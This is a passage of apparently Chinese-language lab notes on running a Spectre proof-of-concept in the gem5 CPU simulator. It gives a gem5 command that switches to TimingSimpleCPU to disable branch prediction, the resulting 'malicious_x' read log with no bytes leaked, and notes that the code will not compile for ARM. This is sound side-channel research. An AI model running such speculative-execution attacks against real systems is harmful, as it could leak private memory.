Reading at malicious_x = 0xfffffffffffd3f2e... Success: 0xFF='?' score=0 
Reading at malicious_x = 0xfffffffffffd3f2f... Success: 0x2E='.' score=1 
Exiting @ tick 83431918696 because exiting with last active thread context
```

将CPU type设置为`TimingSimpleCPU`可以直接关掉分支预测，指令如下：

```bash
$ build/X86/gem5.debug configs/example/se.py -c ./labs/SpectrePoC/spectre.out --cpu-type=TimingSimpleCPU --bp-type=LTAGE --caches --l2cache --l1d_size=32768 --l1i_size=32768 --l1d_assoc=8 --l1i_assoc=8 --l2_size=262144 --l2_assoc=4 --cacheline_size=64 --cpu-clock=2304.008MHz --sys-clock=2304.008MHz --num-cpus=8 
```

结果如下：

```bash
Reading at malicious_x = 0xfffffffffffd3f08... Success: 0xFF='?' score=0 
Reading at malicious_x = 0xfffffffffffd3f09... Success: 0xFF='?' score=0 
Reading at malicious_x = 0xfffffffffffd3f0a... Success: 0xFF='?' score=0 
Reading at malicious_x = 0xfffffffffffd3f0b... Success: 0xFF='?' score=0 
Reading at malicious_x = 0xfffffffffffd3f0c... Success: 0xFF='?' score=0 
Reading at malicious_x = 0xfffffffffffd3f0d... Success: 0xFF='?' score=0 
Reading at malicious_x = 0xfffffffffffd3f0e... Success: 0xFF='?' score=0 
Reading at malicious_x = 0xfffffffffffd3f0f... Success: 0xFF='?' score=0 
Reading at malicious_x = 0xfffffffffffd3f10... Success: 0xFF='?' score=0 
Reading at malicious_x = 0xfffffffffffd3f11... Success: 0xFF='?' score=0 
Reading at malicious_x = 0xfffffffffffd3f12... Success: 0xFF='?' score=0 
Reading at malicious_x = 0xfffffffffffd3f13... Success: 0xFF='?' score=0 
Reading at malicious_x = 0xfffffffffffd3f14... Success: 0xFF='?' score=0 
Reading at malicious_x = 0xfffffffffffd3f15... Success: 0xFF='?' score=0 
Reading at malicious_x = 0xfffffffffffd3f16... Success: 0xFF='?' score=0 
Reading at malicious_x = 0xfffffffffffd3f17... Success: 0xFF='?' score=0 
Reading at malicious_x = 0xfffffffffffd3f18... Success: 0xFF='?' score=0 
Reading at malicious_x = 0xfffffffffffd3f19... Success: 0xFF='?' score=0 
Reading at malicious_x = 0xfffffffffffd3f1a... Success: 0xFF='?' score=0 
Reading at malicious_x = 0xfffffffffffd3f1b... Success: 0xFF='?' score=0 
Reading at malicious_x = 0xfffffffffffd3f1c... Success: 0xFF='?' score=0 
Reading at malicious_x = 0xfffffffffffd3f1d... Success: 0xFF='?' score=0 
Reading at malicious_x = 0xfffffffffffd3f1e... Success: 0xFF='?' score=0 
Reading at malicious_x = 0xfffffffffffd3f1f... Success: 0xFF='?' score=0 
Reading at malicious_x = 0xfffffffffffd3f20... Success: 0xFF='?' score=0 
Reading at malicious_x = 0xfffffffffffd3f21... Success: 0xFF='?' score=0 
Reading at malicious_x = 0xfffffffffffd3f22... Success: 0xFF='?' score=0 
Reading at malicious_x = 0xfffffffffffd3f23... Success: 0xFF='?' score=0 
Reading at malicious_x = 0xfffffffffffd3f24... Success: 0xFF='?' score=0 
Reading at malicious_x = 0xfffffffffffd3f25... Success: 0xFF='?' score=0 
Reading at malicious_x = 0xfffffffffffd3f26... Success: 0xFF='?' score=0 
Reading at malicious_x = 0xfffffffffffd3f27... Success: 0xFF='?' score=0 
Reading at malicious_x = 0xfffffffffffd3f28... Success: 0xFF='?' score=0 
Reading at malicious_x = 0xfffffffffffd3f29... Success: 0xFF='?' score=0 
Reading at malicious_x = 0xfffffffffffd3f2a... Success: 0xFF='?' score=0 
Reading at malicious_x = 0xfffffffffffd3f2b... Success: 0xFF='?' score=0 
Reading at malicious_x = 0xfffffffffffd3f2c... Success: 0xFF='?' score=0 
Reading at malicious_x = 0xfffffffffffd3f2d... Success: 0xFF='?' score=0 
Reading at malicious_x = 0xfffffffffffd3f2e... Success: 0xFF='?' score=0 
Reading at malicious_x = 0xfffffffffffd3f2f... Success: 0xFF='?' score=0 
```

## problems

1. gem5仿真速度极慢；

2. 原代码在arm编译器下无法通过，因此无法在arm CPU上进行仿真。

   ```bash
   $ aarch64-linux-gnu-gcc -o spectre_arm spectre.c --static -std=c99 -O0
   spectre.c:21:10: fatal error: x86intrin.h: No such file or directory
      21 | #include <x86intrin.h> /* for rdtsc, rdtscp, clflush */
         |          ^~~~~~~~~~~~~
   compilation terminated.
   ```

## Reference

[^1]: [Header files for x86 SIMD intrinsics](https://stackoverflow.com/questions/11228855/header-files-for-x86-simd-intrinsics)

[^2]: [static-option-for-gcc](https://stackoverflow.com/questions/8692128/static-option-for-gcc)

[^3]: [Simpoint 在 GEM5 里加速仿真, 1 minute = N day(s)](https://zhuanlan.zhihu.com/p/453370789)